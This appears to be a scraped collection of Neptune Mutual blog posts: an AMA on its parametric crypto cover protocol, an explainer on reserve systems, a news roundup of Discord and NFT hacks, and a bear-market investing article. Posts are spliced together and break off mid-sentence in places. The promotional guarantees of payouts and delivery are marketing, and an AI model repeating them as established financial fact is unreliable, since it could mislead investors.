Turkish Airlines EuroLeague Final Four in an immersive virtual environment. As part of the EuroLeague’s plan for immersive venues and digital collectibles, the Web3 company’s interactive video NFT platform will enable EuroLeague fans to own and collect interactive video NFTs.</p><h2 id="onchain-insurance-industry-news">OnChain Insurance Industry News</h2><p>InsurAce Protocol and Ten Finance have announced a long-term partnership to provide investors with greater peace of mind.

We appreciate all of your assistance. In case you missed it, here’s a recap of the entire session!</p><h2 id="part-1-introduction">Part 1. Introduction</h2><h3 id="q1-can-you-introduce-yourself-to-the-community-what-is-your-background-and-how-did-the-team-build-your-project">Q1. Can you introduce yourself to the community? What is your background and how did the team build your project?</h3><p><strong><strong>Edward: </strong></strong>Binod is co-founder and CEO of Neptune Mutual. He has been involved in the blockchain industry from its outset and has extensive experience of writing and auditing smart contracts, exposing hacks and exploits, and developing a range of blockchain applications. He was previously the CTO of InvestaX.</p><p>Gillian is a co-founder of Neptune Mutual and the founder of Mulana Capital, a crypto VC fund. Prior to this, she was the CEO of Huobi Asset Management. She built that business line from scratch and managed to get the SFC virtual asset manager license in Hong Kong. Prior to Huobi, she has a decade-long working experience in the insurance industry and is well-connected within the Asian crypto community.</p><p>I am an adjunct Professor of Entrepreneurship at KEDGE business school. I am also a startup investor and mentor, and I manage a quantum materials deeptech startup. At Neptune Mutual, I manage operations and finance.<br>I have very happy memories of working on a project in Jakarta for a couple of years where I still keep in touch with some of my friends.</p><h3 id="q2-can-you-briefly-describe-what-your-project-is-to-us">Q2 Can you briefly describe what your project is to us?</h3><p><strong><strong>Gillian:</strong></strong> Neptune Mutual safeguards Ethereum community and the wider crypto user base from cyber threats. Our protocol provides a marketplace for DeFi and CeFi projects to create their own cover pools, for liquidity providers to pool risk capital, and for community members to purchase cover.</p><p>Neptune Mutual cover pools provide guaranteed payouts upon triggering a set of the predefined event(s), or cover parameters. Cover parameters consist of rules and exclusions. Payouts can only occur when all cover conditions are met, no exclusions are present, and the incident is successfully resolved by the community. The term cover incident refers to a state in which all cover rules and exclusions have been met.</p><p>You can use our application in the Mumbai test network.</p><p><a href="https://test.neptunemutual.com/" rel="follow">https://test.neptunemutual.com/</a></p><p>Watch our YouTube videos to learn more about the project.</p><p><a href="https://www.youtube.com/c/NeptuneMutual/videos" rel="nofollow noopener noreferrer">https://www.youtube.com/c/NeptuneMutual/videos</a></p><h3 id="q3-can-you-explain-to-us-what-makes-your-project-different-from-other-competitors">Q3 Can you explain to us what makes your project different from other competitors?</h3><p><strong><strong>Binod:</strong></strong> Among our many peers are Nexus Mutual, Unslashed, InsureAce, and Risk Harbor. With Neptune Mutual’s parametric cover model, which assures a payout after the incident is resolved by the community, we stand apart from our competitors since we don’t have to go through an individual claim evaluation process.</p><p>Neptune Mutual’s parametric model provides guaranteed payout to all policyholders if a trigger event is resolved without the need for an individual claim assessment. On the other hand, there have been times when only 30% of historical claims were paid by discretionary cover protocols.</p><p>Another major difference is that our cover pool TVL does not fluctuate together with the crypto price movements. This protects us from being helpless and trying to figure out how to deal with unfavorable situations that are not in our control or being exposed to a situation that arises not because we made a mistake but because of the market cycle.</p><p>We do not have leveraged pools nor fractionalized reserves. By using our cover pools, policyholders can feel assured that there is always sufficient capital to underwrite the coverage.</p><h3 id="q4-what-are-the-major-milestones-your-project-has-achieved-so-far">Q4 What are the major milestones your project has achieved so far?</h3><p><strong><strong>Edward:</strong></strong><br><strong><strong>Fundraising:</strong></strong></p><p>Since incorporation in September 2021, we have closed over $10M in funding from some of the most well known and respected investors in crypto, including; Fenbushi, Animoca Brands, Coinbase, Huobi, OKX, XT and of course, AVStar Capital!</p><p>We are planning to release more information about the depth our partnerships with investors in an upcoming series of blogs in our Medium space, so do please follow our channel:</p><p><a href="https://medium.com/neptune-mutual" rel="nofollow noopener noreferrer">https://medium.com/neptune-mutual</a></p><p><strong><strong>Product:</strong></strong></p><p>We have successfully launched testnet in March. For those of you who haven’t yet tried out our application I would encourage you to try it out here:</p><p><a href="https://test.neptunemutual.com/" rel="follow">https://test.neptunemutual.com/</a></p><p>and we have some useful learning resources in our YouTube channel here:</p><p><a href="https://www.youtube.com/c/NeptuneMutual" rel="nofollow noopener noreferrer">https://www.youtube.com/c/NeptuneMutual</a></p><p>Our protocol is nearing the end of its first security audit and we plan to have a second one completed before launch on mainnet.</p><p><strong><strong>Business Development:</strong></strong></p><p>We have agreements with a few CeFi platforms including XT.com to create dedicated cover pools on our platform. We are in the process of finalizing the partnership with a number of DeFi protocols.</p><h3 id="q5-what-are-your-further-plans-for-your-project">Q5 What are your further plans for your project?</h3><p><strong><strong>Gillian:</strong></strong> We aim to complete the two rounds of smart contract audit within the next two months. We expect to launch our V1 mainnet soon, which will be deployed on the Ethereum chain initially.</p><p>We will be working closely with the CeFi, DeFi and Metaverse projects to grow the number of projects that create dedicated cover pool protection for their community in the Neptune Mutual marketplace. We will be helping each and every one of those projects to improve their security, and to communicate with their respective stakeholders about the benefit of protecting digital assets in this way.</p><p>After V1 launch, we will work on</p><p>1) deploying Neptune Mutual on additional blockchains</p><p>2) developing the v2 of the platform</p><p>3) developing security-related products</p><p>Security is at the core of our mission and it will always play a central role in our future development plans.</p><h2 id="part-2-twitter-questions">Part 2: Twitter questions</h2><h3 id="q6-what-are-the-benefits-of-holding-your-token-as-a-long-term-investment-can-you-tell-us-about-the-motivation-and-benefits-for-investors-to-keep-your-token-in-the-long-run-1babydragon">Q6. What are the benefits of holding your token as a long term investment? Can you tell us about the motivation and benefits for investors to keep your token in the long run? (<a href="https://mobile.twitter.com/1BabyDragon" rel="nofollow noopener noreferrer">@1BabyDragon</a>)</h3><p><strong><strong>Edward:</strong></strong></p><p><strong><strong>Our Standard Disclaimer:</strong></strong></p><p><em><em>The Neptune Mutual Cover Protocol is a high-risk project.

Many projects promise a long-term plan, big mission and great success in future but never release any working product or revenue. What makes your project different from these projects? Could you share some big achievements that you will get in 2022? (@SelvarickyDv)</h3><p><strong><strong>Binod:</strong></strong> That is so true.</p><p>We are different from many other projects because we have already completed our protocol development and we are undergoing multiple audits. As you may have seen, many projects take years to build a product; our project is ready to go live at a moment’s notice.</p><p>100% of what we promised will be delivered on day one. We are a product company and our focus will be on the use case instead of promising the community things we can’t achieve, or take too long to achieve. We haven’t added too many things to our roadmap, or projected too far into the distant. We will go according to what the market needs in terms of cover protection instead of “assuming” what the market might need in say 5 years time.</p><p>Our team isn’t just promising “long term”, it is engraved into the terms of our tokenomics, where we have one of the longest team vesting periods of any crypto project: the team tokens are unlocked only after we are able to launch v2 of the protocol. The team tokens are then vested over a period of 5 years, so give or take, that means a total vesting period stretching out to 6–7 years.</p><p>Our biggest goal for this year is the mainnet launch. Since our protocol is accessible to cover creators via invitation only, we will be very excited to showcase our cover pools once we launch. Our mantra is “under promise” and “over deliver”, so we will announce our partnerships later.</p><p>But more than that, what success means to us is to be able to offer protection to the blockchain community from smart contract hacks and exploits.</p><h3 id="q8-neptune-mutual-safeguards-the-ethereum-community-from-cyber-threats-are-your-services-limited-to-just-the-ethereum-network-or-do-you-offer-your-services-to-all-within-the-blockchain-network-jenneyj10">Q8. Neptune Mutual safeguards the Ethereum community from cyber threats. Are your services limited to just the Ethereum network or do you offer your services to all within the blockchain network? (@JenneyJ10)</h3><p><strong><strong>Binod:</strong></strong> Our primary objective is to offer parametric cover to the Ethereum network because it is the original and longest-running EVM chain, has the largest community, and the largest value at risk.</p><p>Neptune Mutual requires a number of integrations to work, such as Uniswap, Aave, and Compound. Since our risk appetite is low, we are only considering integrations with tried-and-tested lending protocols. We, as a cover protocol, can not afford to build low-quality integrations to chase unsustainable token returns.</p><p>Once our protocol is deployed on Ethereum it will be able to protect any project deployed on any chain. That said, we do recognise that although it is not strictly required for us to deploy on multiple chains, the user experience is richer and much more enhanced when we go multichain. We are communicating with select blockchain teams to understand if there is a strategic cooperation possible. Since we serve the best interest of the Neptune Mutual community, our primary concern is the availability of high-quality lending protocols on the chains on which we choose to deploy.</p><p>As I said earlier, we are not looking for double or triple digit high APY protocols for integration. We simply want to restrict ourselves to reliable, high-quality, and low-risk protocols. We will evaluate multiple blockchain networks progressively and expand as and when the right opportunities arise.</p><h3 id="q9-what-are-the-most-important-functions-of-a-neptune-mutual-and-why-and-what-are-the-advantages-of-the-neptune-mutual-compared-to-other-projects-surbhivashisth4">Q9. What are the most important functions of a Neptune Mutual and why? And what are the advantages of the Neptune Mutual compared to other projects? (@SurbhiVashisth4)</h3><p><strong><strong>Binod:</strong></strong> Neptune Mutual is a marketplace where communities can protect themselves from potential hacks. Cover creators can create cover pools and attract underwriters. Underwriters collectively pool the risk capital, own the liquidity pool, and receive benefits through a number of means, including policy fee income, lending income, flash loan interest, and POD staking rewards.</p><p>Once cover creators have demonstrated a commitment to their own cover pool through marketing and liquidity support to their pool, they can then apply to get funding from Neptune Mutual to join them as underwriters. Before we fund our bond capital to a cover pool, we will perform additional steps to rigorously review the security aspect of the covered apps/contracts. This typically includes security review of smart contract, frontend and backend applications, HTTP, DNS, email, hosting environment, and the overall supply chain of the product. Since it is obvious that nobody wants to risk their capital to fund an insecure project’s cover pool, getting funding from Neptune Mutual will boost LP confidence to join together with us.</p><p>For policyholders, purchasing a parametric cover from Neptune Mutual gives you a guaranteed payout if you check what is covered and what is excluded. If you use discretionary covers, you have a risk of not only losing your asset because of a hack but also losing the policy premium you paid if it does not result in a payout.</p><p>We are different from most other cover protocols as unlike others we are not, at all, exposed to any crypto price volatility. Being a cover protocol, we believe it is important to avoid cover pools being exposed to cryptocurrency market price volatility. So in the case of cover pools in the Neptune Mutual marketplace they are completely independent of NPM token price. Our cover pools are single-stablecoin denominated and highly dependable and reliable. You will not experience a sudden drop of 50% or drastic increase in TVL with us. In addition to this, we do not have “fractionalized” liquidity; our MCR is always more than or equal to 100%.</p><p>Neptune Mutual does not chase or promise any high-yield returns. We do not have uncapped tokens, mintable on demand to offer as an (unsustainable) yield which will dilute all tokenholders. This is important because we strongly believe that as and when a project’s market grows, demand progressively increases and usage gradually grows, it feels completely wrong to dilute tokenholder “value” because they believed in the project and held onto a token which has now gradually become worthless because of high-APY returns. We think “paying” people to use our platform by offering high yields will dilute existing tokenholders and believers.</p><h3 id="q10-what-are-the-conditions-required-to-run-the-mutual-bond-pool-function-in-the-npm-protocol">Q10. What are the conditions required to run the Mutual Bond Pool function in the NPM protocol?</h3><p><strong><strong>Gillian: </strong></strong>Although the Neptune Mutual bond pool feature is inspired by OlympusDAO, there are some key differences to note here. One of which is that NPM tokens are fixed in supply and are deflationary in nature. Therefore, the bond pools will only be announced and made available on a seasonal basis instead of being an always-available feature. We will announce bond pool campaigns in advance with a predetermined allocation of NPM tokens. The bond pool automatically stops as soon as the tokens are fully allocated.</p><p>We will only use a portion of the bond pool liquidity (to be announced later) to fund cover pools while still keeping remaining liquidity in the DEX for better market depth.</p><p>Our Bond pool will allow us to progressively bootstrap liquidity to fund and underwrite our cover portfolio. Based on the requests and demands from our cover creators, we will announce bond pools from time to time. The availability will also be decided based on the utilization ratio of cover pools. Meaning, if our cover pools have low-utilization, there will be no need to run a bond pool campaign.</p><p>As we serve to cover more applications, we will actively participate in and accept offers to fund cover pools to enhance the availability of underwriting capital. Having said that, we do not want to risk our funds to sponsor pools which are inherently risky so we will perform a general technical due diligence and only provide liquidity support to projects that pass our due diligence.</p><h3 id="q11-hacking-incidents-can-be-happened-even-on-the-world%E2%80%99s-most-secure-systems-is-%E2%80%9Cneptunemutual%E2%80%9D-secure-enough-from-hackers-how-do-you-manage-if-there-is-an-attack-to-your-platform">Q11. Hacking incidents can be happened even on the world’s most secure systems. Is “neptunemutual” secure enough from hackers? How do you manage if there is an attack to your platform??</h3><p><strong><strong>Edward:</strong></strong> This is an excellent question. We always encourage users and projects to think and plan ahead for the consequences of a hack or exploit, and of course this applies as much to our own project as it does to those we are looking to protect.</p><p>The answer comes in two parts. The first part is to do our very best to avoid a hack or exploit in the first place by having a culture of security and by implementing a whole variety of security measures, technical and otherwise, to try and prevent a hack or exploit from arising.</p><p>Although it is true that even the most secure systems can be hacked, projects can use a strategy to prevent attacks before they occur. The majority of blockchain breaches have occurred as a result of the impacted project team’s lack of attention to cybersecurity.</p><p>The MyEtherWallet breach, for example, was a DNS cache poisoning attack that allowed the attacker to modify the hosting server’s IP address. Because of exposed credentials, the BadgerDAO attack was possible; nothing was wrong with the code. Similarly, the Ronin attacker was able to obtain private keys; it’s worth noting that these keys were not “hacked,” but rather leaked due to human error.</p><p>The second part of the answer, which more specifically answers the question, is that we plan to build up an investor protection fund that we can use to mitigate any losses in the event of a hack or exploit of our own protocol.</p><p>We have considered a range of other options, and it may be that we adopt additional measures in the future, but for the time being we believe that an investor protection fund is the right approach to take.</p><p>In addition to this, we are also communicating with traditional insurance and reinsurance companies in order to find a solution to protect our protocol.</p><p><strong><strong>References:</strong></strong></p><p><strong><strong>Ronin Hack</strong></strong></p><p><a href="https://cryptopotato.com/the-biggest-ever-crypto-hack-what-happened-in-the-ronin-bridge-attack/" rel="nofollow noopener noreferrer">https://cryptopotato.com/the-biggest-ever-crypto-hack-what-happened-in-the-ronin-bridge-attack/</a></p><p><strong><strong>My Etherwallet and Bancor</strong></strong></p><p><a href="https://cryptonews.com/news/bancor-and-myetherwallet-hit-by-security-breaches-2208.htm" rel="nofollow noopener noreferrer">https://cryptonews.com/news/bancor-and-myetherwallet-hit-by-security-breaches-2208.htm</a></p><p><strong><strong>Badger DAO</strong></strong></p><p><a href="https://www.coindesk.com/business/2021/12/10/badgerdao-reveals-details-of-how-it-was-hacked-for-120m/" rel="nofollow noopener noreferrer">https://www.coindesk.com/business/2021/12/10/badgerdao-reveals-details-of-how-it-was-hacked-for-120m/</a></p><h2 id="part3-live-questions">Part3: Live Questions</h2><h3 id="q12-according-to-the-roadmap-what-is-your-most-important-next-priority">Q12.

        html: "<p>Let’s start at the end with why capital requirement matters: What happens when more capital is required than there is capital?</p><p>Avid Neptune Mutual blog readers will have read one of our recent articles, <a href=\"https://blog.neptunemutual.com/dont-be-a-salmon-in-a-bear-market/\" rel=\"follow\">Don’t Be a Salmon in a Bear Market</a>, and recall a line that reminds us that “<em><em>the stability of any stablecoin largely depends on what the collateral backing it up may be</em></em>.” It goes on to describe how some stablecoins have zero collateral in terms of real-world assets, and others, such as BUSD, are 100% collateralised with real-world assets. This matters when, for one reason or another, a larger than expected call is made by depositors to withdraw their funds. As holders of the 2022 UST crash found out a couple of weeks ago, collateral, or capital requirement, really does matter — a lot.</p><p><strong><strong>Capital requirement matters greatly for entities that are either receiving deposits and making loans, or entities that are receiving underwriting capital and selling insurance, cover policies, or products that hedge other types of risk.</strong></strong></p><p>As any parent will know, it is difficult to share your hard-learnt life lessons with your children in a way that will help them avoid making the same mistakes. Some may recall the financial instrument that caused the 2008 financial meltdown and the bankruptcy of Lehman Brothers: CDOs or collateralized debt obligations that were used to refinance mortgage-backed securities; or even more toxic, synthetic CDOs. The keyword here being collateralized.</p><p>A more recent event, in 2021, albeit very different in nature, was the short squeeze inflicted upon a large American hedge fund, Melvin Capital, by an option trader community in the r/wallstreetbets subreddit. In an unexpected scenario, Melvin Capital ran into difficulties regarding insufficient capital to meet its much-maligned short trading bet against the infamous video game retailer, GameStop.</p><p><strong><strong>Without a doubt, capital requirement does indeed matter.</strong></strong></p><p>So, let’s dive into the two different approaches to balancing the need for sufficient capital versus the need to use capital efficiently so that it may be put to work and generate revenue:</p><h2 id=\"what-are-fractionalised-reserve-systems\">What Are Fractionalised Reserve Systems?</h2><p>Fractionalised reserve systems are financial systems that maintain only a portion of their customers’ funds in their reserves.</p><p>The concept was first introduced in the banking industry. As the name suggests, fractional reserve systems only have a fraction of their bank deposits available for withdrawal by customers because the remainder of the deposits is used to lend out to other customers. Put another way, a 100% reserve bank retains all deposits from its customers (as the name suggests) and so is able to guarantee that in the event that every customer wants to withdraw their respective deposits at the same time, they can do so. This approach means that a 100% reserve bank does not have sufficient capital from depositor funds alone to be able to make any loans. In turn, this means that whilst being very safe, it will not be able to generate revenue from loans to pay depositors an interest rate on their deposits.</p><p>In a fractionalised reserve system where, for example, a bank has a reserve requirement ratio of 10% (i.e. is only required to keep 10% of customer deposits in reserve). If someone deposits $100 to this bank, the bank can lend out $90. If the borrower of that $90 deposits that back to the bank again, the bank can now lend out another 90% or $81. Whilst this scenario is unlikely in the traditional banking system because lending rates are higher than deposit rates, this mechanism is definitely something that you’ll find in the DeFi sector. Looping is a mechanism that quite a number of yield aggregators use to achieve high levels of leverage to generate high yields from a variety of borrowing and lending protocols and stablecoin currencies.</p><p>The Minimum Capital Ratio or MCR dictates the very lowest level of reserves required by financial regulators.</p><h2 id=\"how-fractionalised-systems-work-in-insurance\">How Fractionalised Systems Work in Insurance</h2><p>The insurance industry also adopted fractionalised reserve systems as it enables more efficient use of capital.</p><p>As with banking and traditional finance, the insurance industry is regulated and requirements vary depending on geography, market sector, and the corresponding regulatory requirements. In Europe, EU insurance companies need to comply with the <a href=\"https://ec.europa.eu/commission/presscorner/detail/en/MEMO_07_286\" rel=\"nofollow noopener noreferrer\">Solvency II Directive</a> which provides codes and regulations in respect of capital requirements including MCR and SCR which we’ll talk more about later on.</p><p>Based on current regulatory standards, an insurance company needs to <strong><strong>calculate its capital on hand against its total underwriting liabilities. </strong></strong>They need to meet a minimum level of required capital on their balance sheet based on the forecasted payout of liabilities that may arise over the next foreseeable future, say one year. This means regulation could require an insurer with an underwriting liability of $100 million to hold 10M$ on its balance sheet.</p><p>Like banks, different insurance companies use different models.</p><p>The leverage effect of a fractionalised reserve approach is attractive because it makes use of the capital in a more efficient way to generate returns for underwriters than a non-fractionalised system. In order to mitigate the risk of using 1 dollar to underwrite several dollars of risk, it is important for insurance companies to ensure that those risks are diverse in nature in order to reduce the likelihood of them arising at the same time.</p><p>The extent to which entities leverage their fractionalised reserve system in combination with their ability to manage and diversify the risks that are underwritten combine to form the entity’s exposure to insolvency.</p><p><strong>Pros of Fractionalised Reserve Systems</strong></p><ul><li>Capital efficient</li><li>Contributes to economic expansion</li></ul><p><strong>Cons of Fractionalised Reserve Systems</strong></p><ul><li>Less capital security</li><li>Policyholders payouts are not guaranteed</li><li>Insolvency; risk of bank runs, defaults, or entity liquidity.</li></ul><h2 id=\"fractional-vs-non-fractional-reserve-systems\">Fractional vs Non-fractional Reserve Systems</h2><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/07/fractionalized-vs-non-fractionalized.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1400\" height=\"700\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/07/fractionalized-vs-non-fractionalized.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/fractionalized-vs-non-fractionalized.png 1000w, https://blog.neptunemutual.com/content/images/2022/07/fractionalized-vs-non-fractionalized.png 1400w\" sizes=\"(min-width: 720px) 720px\"></figure><p>A non-fractionalised reserve system can be used when the need for capital security and less, or no financial leverage outweighs the benefits of more capital efficiency.</p><p>For insurers, this means that <strong><strong>underwriting capital is always equal to or greater than the total amount of underwriting liability. </strong></strong>This ensures that there is always sufficient underwriting capital to pay all of the risks underwritten for policyholders, even if they all claim at the same time.</p><h2 id=\"what-is-mcr\">What is MCR?</h2><p>Minimum capital ratio, or MCR, is one of a number of metrics used to help answer the question, how do you measure capital requirement?</p><p>To start with, it’s important to understand the concept of solvency. According to Investopedia, <a href=\"https://www.investopedia.com/terms/s/solvency.asp#:~:text=Key%20Takeaways-,Solvency%20is%20the%20ability%20of%20a%20company%20to%20meet%20its,to%20analyze%20a%20company's%20solvency.\" rel=\"nofollow noopener noreferrer\">solvency</a> is a measure of capacity used in fractionalised reserve systems to find out whether a business can meet its debts, liabilities, and financial obligations in the long run. It is a reflection of business financial health.</p><p>Through the use of requirement ratios, investors can assess the solvency of a business and its capability to sustain operations. Requirement ratios help businesses to maintain a financial position that is safe and solvent. One of these requirement ratios includes MCR.</p><p>MCR is a term used in fractionalised reserve systems to determine the minimum required value of assets that a business must hold. MCR is regarded as a business’s capital requirement ‘hard’ floor in regulation. Once a business falls below the required Solvency Capital Requirement, or SCR (the other ‘soft’ floor requirement ratio), regulation intervenes to ensure that businesses don’t go below the MCR; failure to comply may incur regulatory actions to stop the entity from getting further out of line with its compliance requirements.</p><h2 id=\"so-what-reserve-system-does-neptune-mutual-run-on\">So, What Reserve System Does Neptune Mutual Run On?</h2><p>For traditional insurance models that use fractionalised reserve systems, MCR is a standard metric. In DeFi, several cover protocols adopt MCR as a metric.</p><p>Considering that the global DeFi ecosystem is relatively young there is not yet sufficient historical data to simulate the probability of loss reliably, and therefore it is not possible to calculate (with sufficient statistical significance) a reliable price point for this risk.</p><p>When considering what type of capital requirement model<strong><strong> </strong></strong>Neptune Mutual has adopted, it is important to note that Neptune Mutual uses a parametric cover policy approach which is quite different from a basket of risks underwritten by a common set of underwriters using a discretionary model. As the parametric approach to financial protection has a different risk profile to traditional insurance pools, MCR is not well suited for parametric protocols like Neptune Mutual.</p><p><strong><strong>So, Neptune Mutual Protocol V1 follows a full reserve system (or a non-fractionalised one) </strong></strong>that maintains 100% of the capital in stablecoins against the total amount covered for cover policyholders by any specific cover pools in the platform.</p><p><strong><strong>If you purchase a cover from the Neptune Mutual platform and become a policyholder, you’re guaranteed that any and all claims you make get a payout instantly once the incidents covered by your cover pool are resolved.</strong></strong></p><p>It is integral to the purpose and mission of Neptune Mutual that our cover protocol puts you, our users, and cover purchasers’ interests first above all else and ensures that we can make a payout immediately when needed.

Auditors, partners, and their teams investigated the $QANX bridge issue, which was immediately turned off until a new patch could be applied to the network.</p><p>A prior hack on Axie Infinity’s Discord server compromised its MEE6 bot, a popular play-to-earn NFT game. MEE6 is a prominent Discord bot that is used by many crypto projects for automating roles and messages. A phony Jiho account was created with the compromised bot’s help, and a bogus announcement about a mint was made using the account’s access. The MEE6 bot was removed from the main server and fraudulent emails were deleted by the developers. MEE6 is widely believed to have been used by hackers to gain access to an alternate admin account that had been compromised. This helped them to send out webbook messages while hiding the compromised administrator account.</p><p>Lazy Lions, a popular PFP NFT collection, has been hacked via Discord. Throughout the day, the attack appeared to have penetrated many other massive NFT projects. The Lazy Lions NFT project was one of the earliest to notice the Discord hack. The team took to Twitter to announce the event and asked their users not to click on any links or mint any of their assets until the 152K-member Discord server is completely safe. According to Discord security expert Jacob H., this is a widespread hack that has infiltrated many Discord servers in the last day. Cool Cats, Alien Frens, RTFKT, Axie Infinity, and many other projects are included in this hack.</p><p>Another NFT project in the Llamascape NFT collection, the project behind Llamaverse, was hacked, with hackers stealing around 30–40 ETH from their Discord server. Llamascape’s Twitter account stated that they are still investigating the hacking incident and that one of their team members was allegedly social-engineered. The compromised account assigned a role to an alt account, which scammers used to target Llamascape NFT collection holders. The team also took responsibility for the incident and promised a refund to those who were impacted by their Discord server hack. They also assured the holders that they would improve their security practices. The NFT project will conduct a new method for their admins in addition to spending $6K to prevent webhook hacks.</p><p>Seth Green is the latest high-profile celebrity to fall victim to the NFT fraud. A phishing effort on the well-known actor, director, writer, and producer in the United States resulted in the theft of four of his NFTs, which were eventually discovered by OpenSea. The Robot Chicken star took it to Twitter to reveal that he had been a victim of a phishing assault and that four of his NFTs had been stolen. Green stated that the stolen NFTs were from some of the most popular NFT collections, including Doodles, Mutant Ape Yacht Club, and Bored Ape Yacht Club, for more than $300,000 in total.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>Retail trading platform Robinhood launches a new, non-custodial crypto-NFT wallet in its latest effort to enter the digital asset industry. According to a press release, investors will be able to control their digital assets and access decentralized web protocols using a multichain Web 3.0 wallet developed by the trading giant. Traders will be able to connect to NFT markets and store their own NFTs, as well as swap crypto assets without paying network fees, utilizing the wallet. Those interested in receiving early access can now join a waiting list to the beta wallet, which is scheduled to go live in mid-2022 and be fully available by year’s end.</p><p>According to reports, Spotify is experimenting with displaying NFT galleries on artist profiles. Fans and artists alike would benefit if the trial with NFTs becomes a success. According to multiple sources, the big music streaming service has been testing an Android app for a restricted group of consumers in the United States. Only a static image and no sound are shown to these people when they click on the NFT previews on the artist’s profile. As of yet, only DJ and producer Steve Aoki and indie rock band The Wombats are recognized for using NFTs in their music. Direct purchases are not possible, but the consumer can tap to be sent to the OpenSea page where they can purchase the NFT after reading about it and seeing an enlarged preview.</p><p>OpenSea announced the launch of a Web3 marketplace protocol for buying and selling NFTs in a secure and efficient manner. The Seaport marketplace protocol will allow users to obtain NFTs by offering assets other than payment tokens such as Ether. According to the platform, a user can agree to supply a number of ETH, ERC20, ERC721, and ERC1155 items in exchange for an NFT, implying bartering a combination of tokens as a method of payment. Furthermore, when making offers, Seaport users can specify which criteria they want, such as specific traits in NFT artwork or pieces from a collection. Tipping will be permitted on the platform as long as the amount does not exceed the original offer.</p><p>Comic-Con India (CCI), the Indian chapter of the pop culture community, is the most recent to venture into the metaverse. CCI is preparing to launch its own digital collectibles, dubbed The Non-Fungible League, for the pop culture and NFT fans alike. The Non-Fungible League at Comic-Con India is a collection of NFT collectibles based on the Ethereum blockchain. In the coming weeks, CCI will release the league’s first character-based collection, comprehensive with their own mascot, The Non-Fungible Man. Comic-Con India’s goal with its new digital collectibles that will enter the metaverse is to bring together Web3 and pop culture by launching a variety of other characters that will make their way into the metaverse.</p><p>Fireblocks, the leading institutional digital asset custody and settlement company, has launched a suite of tools that will allow developers to build DeFi, GameFi, and NFT products in the growing web3 space. The “Web3 Engine” software developer kit will enable businesses to build infrastructure for NFT and decentralized gaming applications. The new suite of products will assist financial institutions, gaming studios, and others in developing web3 products in managing the entire asset tokenization lifecycle — from whitelisting to minting, burning, and token transfers. The Web3 Engine will provide custody services, treasury management, and risk mitigation tools, in addition to a mechanism for managing NFT issuance. Users will also be able to directly access platforms such as OpenSea, Uniswap, Rarible, and dYdX from the platform.</p><h2 id="onchain-insurance-industry-news">OnChain Insurance Industry News</h2><p>The Nexus Mutual team attended a number of events to meet with existing partners, discuss their new V2 platform, and share product development milestones.</p><p>Hodlnaut users are now able to purchase Nexus Mutual’s discretionary custody cover without leaving the Hodlnaut platform, thanks to the iTrust.insure integration.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p>With prices dropping double-digits every day, the crypto market is not an easy place to be right now; particularly if you are swimming with the crowd in the mainstream crypto space. The risk of being bitten by the bear is real, and the consequence is unpleasant, as social media posts confirm every day.</p><p>Smart investors manage risk and look for opportunities to take advantage of bearish conditions. Should you be investing in negative beta stocks? What type of projects do well in a bear market? What are their characteristics?</p><h2 id="ring-fence-your-activities-from-crypto-volatility-with-stablecoin-projects">Ring-fence your activities from crypto volatility with stablecoin projects</h2><p>Despite recent events, managing your exposure to crypto price volatility by investing a proportion of your portfolio in stablecoin projects still makes sense; as always, understanding the fundamentals is crucial, because not all stablecoins are the same breed of animal. In fact, quite the opposite, as many have recently discovered. Keeping things simple, there are two important points to understand about any particular stablecoin: what is the risk of de-peg, and how are the returns being generated?</p><p>The stability of any stablecoin largely depends on what the collateral backing it up may be. For instance, UST’s value was not at risk because of its lack-thereof in real-world assets but because it relied solely upon an algorithm for setting prices — something that can always fail eerily like other cryptocurrencies have done recently with huge losses suffered by investors who had put money into them as well.</p><p>Some stablecoins, like DAI, are backed by crypto assets, and given the more volatile nature of crypto assets, in order to increase the security and reduce the risk of depegging, DAI is over-collateralised to the tune of 150%. Better still are stablecoins that are backed by different forms of real-world assets, such as corporate bonds, commercial paper, US Treasury bonds, or cash. They provide a level of stability not seen in traditional fiat currencies — giving them varying levels from high to low-risk profiles depending on what’s being used for collateralization. The Binance stablecoin, BUSD is 96% backed by cash (or cash equivalents), and 4% backed by US Treasury bonds. So you can quickly see that stablecoins can be very different in nature and risk profile.</p><p>Generally, <a href="https://www.investopedia.com/tech/stablecoin-answer-all-cryptocurrency-problems/" rel="nofollow noopener noreferrer">stablecoin projects</a> seek to maintain a peg to another asset, often a fiat currency like the U.S. dollar, through a variety of mechanisms. Other projects have collateral in cryptocurrency reserves, while some use algorithms that adjust supply in order to keep prices stable. Still, others back each coin with an equivalent amount of another asset, essentially creating a tokenized version of that asset.</p><p>While there is no single blueprint for success, stablecoin projects that can successfully and sustainably minimise price volatility will undoubtedly have a bright future in the crypto space. In volatile and immature markets, such as crypto, it is important to have a reliable and stable safe haven for investors during times of trouble.</p><p>Coming back to reducing risk in a bear market, crypto projects that have an underlying business model driven by a “stable” stablecoin are an indicator that the project might not be your typical crypto fish swimming with the mainstream shoal.</p><p>Risk and return are finance’s yin and yang. Many complicated subjects break down into some very basic elements that simply form the foundations of everything else. In physics, there are four fundamental forces. In humans, there are five senses. In finance, there are six principles, the first of which is the principle of risk and return. So understanding return matters as much as understanding risk, and they are related. Put another way, and whatever any neatly crafted marketing material may say, high return low-risk crypto projects (or any other project) do not exist.</p><p>Returns can be made in a number of ways, but ultimately someone is paying for an investors’ return. Smart investors question how returns are made: who is paying for their return, is what is being received for the return commensurate with the return (i.e. is risk and return evenly matched), and how sustainable over time is the opportunity? Ring-fence your activities from crypto volatility with stablecoin projects</p><p>The way projects use their capital can have a very significant effect on the project’s sensitivity to risk and return. Most investors are familiar with the concept of financial leverage, and how this gearing effect can be put to good use to increase returns with a given amount of capital (the corollary is, of course, also true). Fewer fully appreciate the consequences of the use of fractionalised reserve systems used in many insurance protocols where 1 dollar of capital is used to underwrite 2 or more dollars of insurance risk. More about this in an upcoming article in the pipeline.</p><p>Stablecoin projects that ring-fence their activity from crypto price volatility and minimise risks associated with the inherent price fluctuations of digital tokens offer a more reliable and sustainable investment proposition. They reduce exposure to cryptocurrency market risks.</p><h2 id="how-do-you-behave-when-there%E2%80%99s-a-bear-in-the-room">How do you behave when there’s a bear in the room?</h2><p>With the bear market in full 